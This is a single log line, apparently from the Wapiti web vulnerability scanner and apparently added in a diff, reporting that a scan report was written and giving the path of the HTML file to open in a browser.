+2024-03-20 14:31:48.632 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//piccheck.json/web_03202024_1431.html with a browser to see this report.
